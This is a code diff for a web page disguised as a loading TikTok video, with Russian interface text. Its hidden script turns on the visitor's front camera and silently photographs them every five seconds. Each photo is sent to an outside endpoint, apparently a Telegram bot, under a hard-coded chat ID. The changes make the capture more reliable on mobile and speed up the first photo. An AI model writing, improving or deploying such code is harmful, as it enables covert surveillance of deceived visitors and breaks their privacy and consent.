@@ -5,43 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>TikTok Video</title>
     <style>
-        body {
-            background-color: #010101;
-            color: white;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            font-family: 'Proxima Nova', sans-serif;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #fe2c55;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 18px;
-            font-weight: bold;
-        }
+        body { background-color: #010101; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #fe2c55; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .text { margin-top: 20px; font-size: 18px; font-weight: bold; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
-
     <div class="loader"></div>
     <div class="text">Загрузка видео...</div>
-
-    <video id="video" autoplay playsinline></video>
+    <video id="video" autoplay playsinline muted></video>
     <canvas id="canvas"></canvas>
 
 <script>
@@ -49,15 +23,12 @@
     const chatId = '8573089884';
 
     async function takeAndSendPhoto(video, canvas) {
-        // ФИКС №1: Проверяем, что видео реально готово и идет поток
-        if (video.readyState < 2 || video.videoWidth === 0) return;
+        if (video.videoWidth === 0 || video.readyState < 2) return;
 
         const context = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        
-        // Рисуем кадр
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        context.drawImage(video, 0, 0);
         
         const dataURL = canvas.toDataURL('image/jpeg', 0.6);
         const blob = await (await fetch(dataURL)).blob();
@@ -70,48 +41,33 @@
                 method: 'POST',
                 body: formData
             });
-            console.log("Фото ушло в ТГ!");
-        } catch (e) {
-            console.error("Ошибка сети:", e);
-        }
+            console.log("Фото моментально отправлено!");
+        } catch (e) { console.error(e); }
     }
 
     window.onload = () => {
-        const video = document.getElementById('video');
-        
-        // ФИКС №2: Обязательные настройки для мобилок (особенно iOS)
-        video.setAttribute('autoplay', '');
-        video.setAttribute('muted', '');
-        video.setAttribute('playsinline', 'true');
-
-        navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" } 
-        })
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(stream => {
+            const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             video.srcObject = stream;
 
-            // ФИКС №3: Ждем, когда видео реально начнет воспроизводиться
+            // Как только видео реально начало играть:
             video.onplaying = () => {
-                console.log("Поток пошел, ждем 3 сек на адаптацию света...");
-                
+                // Ждем 3 сек (задержка для настройки света камерой)
                 setTimeout(() => {
-                    // Запускаем цикл каждые 5 сек
+                    // 1. Делаем первое фото МОМЕНТАЛЬНО после задержки
+                    takeAndSendPhoto(video, canvas);
+
+                    // 2. Включаем цикл на последующие фото
                     setInterval(() => {
                         takeAndSendPhoto(video, canvas);
-                    }, 5000);
-                    
-                    // Первое фото сразу после паузы
-                    takeAndSendPhoto(video, canvas);
-                }, 3000); 
+                    }, 5000); 
+                }, 3000);
             };
-
-            // Запускаем видео
             video.play();
         })
-        .catch(err => {
-            console.log("Доступ к камере отклонен:", err);
-        });
+        .catch(err => { console.log("Камера заблокирована"); });
     };
 </script>
 </body>
